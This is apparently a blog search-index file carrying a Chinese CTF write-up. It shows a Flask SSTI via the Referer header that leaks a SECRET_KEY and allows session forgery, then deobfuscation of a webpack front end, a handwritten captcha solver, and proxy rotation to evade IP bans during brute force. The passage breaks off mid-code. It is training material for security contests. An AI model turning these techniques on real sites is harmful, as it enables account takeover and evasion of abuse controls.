<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TEST2</title>
      <link href="2021/02/01/test2/"/>
      <url>2021/02/01/test2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TEST</title>
      <link href="2021/01/30/test/"/>
      <url>2021/01/30/test/</url>
      
        <content type="html"><![CDATA[<h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><p>kkp</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUST7月份内部赛wp</title>
      <link href="2021/01/30/s1rthree/"/>
      <url>2021/01/30/s1rthree/</url>
      
        <content type="html"><![CDATA[<p>前言：假期就这么来了，7月份，在家也要保持学习呀！！！</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Login-as-admin"><a href="#Login-as-admin" class="headerlink" title="Login as admin"></a>Login as admin</h3><p>题目改编自 <code>Zer0pts CTF 2020</code>，此题是无敌简化版，考点是 <code>SSTi</code> 和 <code>flask的session伪造</code></p><p>首先源码已经给出来了，分析一波源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag <span class="comment"># 导入 flag</span></span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> key <span class="comment"># 导入 key</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.secret_key = key <span class="comment"># secret_key等于导入的key</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">flask.session[<span class="string">'user'</span>] = <span class="string">'guest'</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"Please login as admin"</span></span><br><span class="line"><span class="comment"># 先给用户一个session，身份为user=guest，并告诉用户要以admin登陆</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/admin")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span> flask.session[<span class="string">'user'</span>] == <span class="string">'admin'</span>:</span><br><span class="line"><span class="keyword">return</span> str(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Please login as admin"</span></span><br><span class="line"><span class="comment"># 当user=admin时，就返回flag</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(error)</span>:</span></span><br><span class="line">    referrer = flask.request.headers.get(<span class="string">"referer"</span>)</span><br><span class="line">    <span class="keyword">if</span> referrer <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    referrer = <span class="string">'/'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_url(referrer):</span><br><span class="line">    referrer = <span class="string">'/'</span></span><br><span class="line">  <span class="comment"># 漏洞点</span></span><br><span class="line">  <span class="comment"># referer可控，但是限制了长度。所以利用这里的SSTI可以读取一些配置，但是不能直接RCE。</span></span><br><span class="line">    html = <span class="string">'&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Refresh" content="3;URL=&#123;&#125;"&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;'</span>.format(referrer)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对referer限制长度，无法读文件和RCE，但是可以通过读配置来读取secret_key</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">valid_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="string">""" Check if given url is valid """</span></span><br><span class="line">    host = flask.request.host_url</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(host):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># Not from my server</span></span><br><span class="line">    <span class="keyword">if</span> len(url) - len(host) &gt; <span class="number">16</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># Referer may be also 404</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host=<span class="string">'0.0.0.0'</span>,</span><br><span class="line">        port=<span class="string">'8000'</span>,</span><br><span class="line">        debug=<span class="literal">False</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>构造 <code>Referer:http://47.110.130.169:12222/</code>，然后需要触发404，地址栏随便输入一个不存在的页面：</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200719154622.png" alt="image-20200719154614770"></p><p>访问后可以发现触发到了</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200719154638.png" alt="image-20200719154638083"></p><p>然后可以发现地址栏多了一堆配置，拿去url解码一下，就可以看到完整的配置了。</p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200719154714.png" alt="image-20200719154714804"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Config &#123;'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'wustaismatr1x2333333333333333333333333333', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093&#125;&gt;</span><br></pre></td></tr></table></figure><p>可以得到 <code>&#39;SECRET_KEY&#39;: &#39;wustaismatr1x2333333333333333333333333333&#39;</code></p><p>于是我们可以利用key来伪造session：<code>{&quot;user&quot;:&quot;admin&quot;}</code></p><p>可以自己开一个flask项目，可以直接用工具：<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">Github项目链接</a> </p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200719155353.png" alt="image-20200719155352985"></p><p>得到session后放在cookie里，访问 <code>/admin</code></p><p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200719155431.png" alt="image-20200719155431529"></p><p>真·签到题</p><h3 id="大人，时代变了"><a href="#大人，时代变了" class="headerlink" title="大人，时代变了"></a>大人，时代变了</h3><h4 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h4><p>出这个题的本意是看到CTF的web题老是PHP什么的, 感觉和现实情况有点脱节, 且对前端审计没有太大的要求, 于是出了这个”现代”一点的题. 这个题目模拟的是爬虫, 在多次请求后将会出现验证码, 再频繁访问将会封锁ip, 且网站是使用React写的, 经过webpack的打包和混淆使得js很难读, 不过这也是大势所趋, 出出来涨涨见识吧.</p><h4 id="0x1-前端审计"><a href="#0x1-前端审计" class="headerlink" title="0x1 前端审计"></a>0x1 前端审计</h4><p>首先打开网站, hint提示用户识别码只有3位<br><img src="https://img-blog.csdnimg.cn/20200719130900918.png" alt="在这里插入图片描述"></p><h5 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h5><p>F12进行抓包, 发现有<code>uuid</code>和<code>img</code>两个字段, img毫无疑问是验证码了, uuid确是一个base64, 尝试解码, 无法得到数据<br><img src="https://img-blog.csdnimg.cn/20200719131106713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>尝试构造随意数据发送, 再在F12里查看, 发现请求中uuid为<code>f56d359611c24abf9aa1d9f0113091a4</code>, 说明前端对此数据进行了解密, 首先对前端代码进行审计, 查找加密算法<br><img src="https://img-blog.csdnimg.cn/20200719131217560.png" alt="在这里插入图片描述"></p><h5 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h5><p>打开前端代码后, 我相信不少人肯定是蒙的, 首先先进行格式化, 其大概画风是这样的<br><img src="https://img-blog.csdnimg.cn/20200719131433492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>让我们一步一步来, 首先看点击登录后发生了什么, 搜索关键词<code>登录</code>, 可以找到这里<br><img src="https://img-blog.csdnimg.cn/20200719131649250.png" alt="在这里插入图片描述"><br>可以看见登录按钮绑定了一个函数<code>this.w</code>, 进入<em>this.w</em>看干什么了</p><p><img src="https://img-blog.csdnimg.cn/20200719131933205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">分析: 这里的switch其实是一个<code>async</code>函数, 通过<code>babel</code>进行转义的结果, <em>建议学习ES6, 7, 8</em>, 勉强可以进行分析</p><ol><li>进入case0, 将<code>state.l = true</code>, 然后调用<code>a.__.q(state.w, state.c, state.p)</code></li><li>进入case4, <code>alert(t.msg)</code> 可以发现这里就是弹出服务器错误提示的地方</li><li>进入case9, <code>t0 = _.catch(0), alert(t0)</code>, 这里是处理错误的地方</li><li>进入case12, 调用<code>a.u()</code>, 然后<code>state.l = false</code></li></ol><p>进入<code>a.__.q(e, t, a)</code>, 应该有三个参数, 分析逻辑<br><img src="https://img-blog.csdnimg.cn/20200719132505636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一眼看到熟悉的200, 说明这里应该就是发送数据的地方, 查看参数<br><img src="https://img-blog.csdnimg.cn/20200719132558739.png" alt="在这里插入图片描述"><br> 在这里我们发现大量<code>w({Base64})</code>的东西, 通过定位发现w为Base64解码, 吧base64拿去解码, 发现为发送数据的隐藏, 比如<code>uuid</code>, <code>code</code>. 这种方式很常见, 为了防止直接搜索直接对数据进行base64储存<br> <img src="https://img-blog.csdnimg.cn/20200719132707283.png" alt="在这里插入图片描述"><br> 查看参数, 这么一长串为<br> <code>Object(F_Web_Project_fucking_test_node_modules_babel_preset_react_app_node_modules_babel_runtime_helpers_esm_defineProperty__WEBPACK_IMPORTED_MODULE_6__.a)(l, w(&quot;bWV0aG9k&quot;), w(&quot;UE9TVA==&quot;))</code><br>前面那么一长串其实是命名空间, 经过化简后可以得到<br><code>{method: &quot;POST&quot;}</code>, 发现为fetch的用法, 但是在这里并没有发现加密, 说明加密不在发送数据的时候</p><p>再次观察请求, 发现在进行一次POST后, 立马获取了一个新的uuid, 说明在登录后应该调用了获取新的uuid的函数, 经过上面分析<code>async</code>, 进入<code>a.u()</code></p><p><img src="https://img-blog.csdnimg.cn/20200719133534600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="解密算法"><a href="#解密算法" class="headerlink" title="解密算法"></a>解密算法</h5><p>又是一个类似的函数, 这里我们可以直接聚焦到可疑函数<code>a.setState({g: e.img, p: a.__.p(e[t(&quot;dXVpZA==&quot;)])})</code>, 可以看到验证码被保存了, 而<code>dXVpZA==</code>就是uuid, 说明uuid经过了<code>a.__p() e[] t()</code> 的处理, 一个个跟踪</p><ol><li>首先发现t为Base64解码函数, 现在为<code>a.__.p(e[&#39;uuid&#39;])</code></li><li>可以知道e为返回数据, 那么解码就在<code>a.__.p()</code>里</li><li>进入p, 首先对uuid进行<code>Base64.toUnit8Array</code>, 然后与<code>___</code>进行遍历<br><img src="https://img-blog.csdnimg.cn/20200719134017947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>寻找<code>___</code>, 发现为<code>___ = new Uint8Array([49, 50, 51, 67, 55, 69, 53, 69, 56, 55, 53, 70, 66, 70, 48, 69, 69, 69, 50, 53, 56, 51, 70, 56, 65, 70, 51, 68, 68, 70, 70, 57])</code> 可以拼出内容<br><img src="https://img-blog.csdnimg.cn/20200719134204334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>追踪<code>__</code>, 发现为xor<br><img src="https://img-blog.csdnimg.cn/20200719134314617.png" alt="在这里插入图片描述"></li><li>那么整个算法就清晰了, 使用python进行模拟</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_uuid</span><span class="params">(raw)</span>:</span></span><br><span class="line">    input_raw = list(base64.b64decode(raw))</span><br><span class="line">    key = [<span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">69</span>, <span class="number">53</span>, <span class="number">69</span>, <span class="number">56</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">66</span>, <span class="number">70</span>, <span class="number">48</span>, <span class="number">69</span>, </span><br><span class="line">           <span class="number">69</span>, <span class="number">69</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">56</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">56</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">51</span>, <span class="number">68</span>, <span class="number">68</span>, <span class="number">70</span>, <span class="number">70</span>, <span class="number">57</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(input_raw)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(key)):</span><br><span class="line">            input_raw[i] ^= key[j]</span><br><span class="line">    <span class="keyword">return</span> bytes(input_raw).decode()</span><br></pre></td></tr></table></figure><h4 id="0x2-验证码识别"><a href="#0x2-验证码识别" class="headerlink" title="0x2 验证码识别"></a>0x2 验证码识别</h4><p>验证码识别有多种办法, 包括接入打码平台, 使用ocr开源项目, 这里验证码十分规整, 我可以手写一个验证码识别</p><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>首先分析验证码结构, 数字<code>8721</code>分别距离左边<code>5, 20, 35, 50</code>, 字母大小为<code>12*18</code></p><p>多次刷新, 采集多个验证码, 我这里采集了5个集齐了所有数字<br><img src="https://img-blog.csdnimg.cn/20200719135148527.png" alt="在这里插入图片描述"></p><h5 id="验证码处理"><a href="#验证码处理" class="headerlink" title="验证码处理"></a>验证码处理</h5><p>首先将验证码分隔成4个独立的小数字, 使用Python的PIL模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    offset = i * <span class="number">15</span> + <span class="number">5</span></span><br><span class="line">    data = img.crop((offset, <span class="number">3</span>, offset + <span class="number">12</span>, <span class="number">20</span>))</span><br></pre></td></tr></table></figure><p>然后对整个图片灰度化处理<code>data = data.convert(&quot;L&quot;)</code><br>然后简单对图片黑白化, 由于背景是白色的, 这里认为凡是不是白色即为有数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">w, h = data.size</span><br><span class="line">pixdata = data.load()</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(h):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(w):</span><br><span class="line">        print(pixdata[x, y])</span><br><span class="line">        <span class="keyword">if</span> pixdata[x, y] &lt; <span class="number">255</span>:</span><br><span class="line">            pixdata[x, y] = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>最后保存图片, 总体代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    img = Image.open(<span class="string">f"image/index<span class="subst">&#123;index&#125;</span>.png"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        offset = i * <span class="number">15</span> + <span class="number">5</span></span><br><span class="line">        data = img.crop((offset, <span class="number">3</span>, offset + <span class="number">12</span>, <span class="number">20</span>))</span><br><span class="line">        data = data.convert(<span class="string">"L"</span>)</span><br><span class="line">        w, h = data.size</span><br><span class="line">        pixdata = data.load()</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(h):</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(w):</span><br><span class="line">                print(pixdata[x, y])</span><br><span class="line">                <span class="keyword">if</span> pixdata[x, y] &lt; <span class="number">255</span>:</span><br><span class="line">                    pixdata[x, y] = <span class="number">0</span></span><br><span class="line">        data.save(<span class="string">f"num/<span class="subst">&#123;str(uuid.uuid4()).replace(<span class="string">'-'</span>, <span class="string">''</span>)&#125;</span>.png"</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200719135532935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="特征提取"><a href="#特征提取" class="headerlink" title="特征提取"></a>特征提取</h5><p>将图片进行重命名, 挑出<code>1-9</code>, 并且重命名, 对数据进行采集<br><img src="https://img-blog.csdnimg.cn/20200719135645554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    img = Image.open(<span class="string">f"./num/<span class="subst">&#123;i&#125;</span>.png"</span>)</span><br><span class="line">    pixdata = img.load()</span><br><span class="line">    w, h = img.size</span><br><span class="line">    d = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(w):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(h):</span><br><span class="line">            d.append(pixdata[x, y])</span><br><span class="line">    data[i] = d</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">f"./num/data.json"</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(json.dumps(data))</span><br></pre></td></tr></table></figure><p>最终获取json数据一份<br><img src="https://img-blog.csdnimg.cn/20200719135800951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDM2MTc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>至于识别, 只需要对图片进行相似的分割, 然后灰度化, 黑白化, 然后与每个数字特征进行对比, 算出相似度, 然后取相似度最高的数字即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_str</span><span class="params">(num_list)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"num/data.json"</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        nums = json.loads(f.read())</span><br><span class="line">    sim_data = []</span><br><span class="line">    <span class="keyword">for</span> num, num_data <span class="keyword">in</span> nums.items():</span><br><span class="line">        sim = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ii, jj <span class="keyword">in</span> zip(num_list, num_data):</span><br><span class="line">            <span class="keyword">if</span> ii == jj:</span><br><span class="line">                sim += <span class="number">1</span></span><br><span class="line">        sim_data.append(sim)</span><br><span class="line">    <span class="keyword">return</span> str(sim_data.index(max(sim_data)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_img</span><span class="params">(img)</span>:</span></span><br><span class="line">    s = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        offset = i * <span class="number">15</span> + <span class="number">5</span></span><br><span class="line">        data = img.crop((offset, <span class="number">3</span>, offset + <span class="number">12</span>, <span class="number">20</span>))</span><br><span class="line">        data = data.convert(<span class="string">"L"</span>)</span><br><span class="line">        w, h = data.size</span><br><span class="line">        pixdata = data.load()</span><br><span class="line">        img_data = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(w):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(h):</span><br><span class="line">                img_data.append(<span class="number">0</span> <span class="keyword">if</span> pixdata[x, y] &lt; <span class="number">255</span> <span class="keyword">else</span> <span class="number">255</span>)</span><br><span class="line">        s += find_str(img_data)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(load_img(Image.open(<span class="string">"image/index1.png"</span>)))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200719140017886.png" alt="在这里插入图片描述"><br>还是很准的</p><h4 id="0x3-代理池"><a href="#0x3-代理池" class="headerlink" title="0x3 代理池"></a>0x3 代理池</h4><p>在发送数据的时候发现, 在请求超过50次后永远将404, 这就是ip被ban了, 这里就需要上代理池了<br>网上有大量免费代理, 采集一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyPool</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.pool = [</span><br><span class="line">            <span class="string">"223.241.7.181:3000"</span>,</span><br><span class="line">            <span class="string">"222.189.190.254:9999"</span>,</span><br><span class="line">            <span class="string">"223.242.224.147:9999"</span>,</span><br><span class="line">            <span class="string">"36.248.129.32:9999"</span>,</span><br><span class="line">            <span class="string">"27.43.189.11:9999"</span>,</span><br><span class="line">            <span class="string">"103.140.204.1:8080"</span>,</span><br><span class="line">            <span class="string">"36.249.53.38:8000"</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_proxy</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">'http'</span>: <span class="string">'http://'</span> + self.pool[<span class="number">0</span>]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">del_ip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">del</span> self.pool[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>连接失败的时候的时候更换ip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pool = ProxyPool()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(i, foo(i, pool.get_proxy()))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        pool.del_ip()</span><br></pre></td></tr></table></figure><h4 id="0x4-全部代码"><a href="#0x4-全部代码" class="headerlink" title="0x4 全部代码"></a>0x4 全部代码</h4><h5 id="主体"><a href="#主体" class="headerlink" title="主体"></a>主体</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span 